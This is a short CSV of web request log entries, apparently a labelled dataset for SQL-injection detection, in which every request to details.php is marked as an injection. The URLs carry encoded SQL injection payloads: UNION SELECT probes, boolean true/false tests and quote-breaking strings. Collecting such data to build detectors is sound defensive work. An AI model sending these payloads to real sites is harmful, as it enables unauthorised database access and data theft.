full_url,event_time,hostname,injection
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x71717a6271%2C0x416e50517173674b784e%2C0x717a626271%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=%3F,1681395118.543434,192.168.43.6,1
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x4572706a674855436d64%2C0x717a626271%29--%20-&type=%3F,1681395118.54865,192.168.43.6,1
/details.php?prod=-2058%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71717a6271%2C0x506d66476f456a657a627a526a5059615562657455436e647444566954537568566b5254616f7662%2C0x717a626271%29%2CNULL%2CNULL%2CNULL--%20-&type=%3F,1681395118.558081,192.168.43.6,1
/details.php?prod=-7371%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C0x5653424a417755614d564275445672766a7552504e5468686a4b6d4c7a564e536b46586d71476e66%2C0x717a626271%29--%20-&type=%3F,1681395118.612434,192.168.43.6,1
/details.php?prod=-2416%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x71717a6271%2C%28CASE%20WHEN%20%284365%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%204365%29%20THEN%201%20ELSE%200%20END%29%2C0x717a626271%29--%20-&type=%3F,1681395118.632125,192.168.43.6,1
/details.php?prod=5&type=8429,1681395120.600657,192.168.43.6,1
/details.php?prod=5&type=%3F.%2C%29.%2C%2C%28%22.%27,1681395120.606028,192.168.43.6,1
/details.php?prod=5&type=%3F%27DjwSfm%3C%27%22%3EyFLhiq,1681395120.611527,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%204518%3D1491--%20ebZB,1681395120.718613,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AND%205104%3D5104--%20KXCL,1681395120.730996,192.168.43.6,1
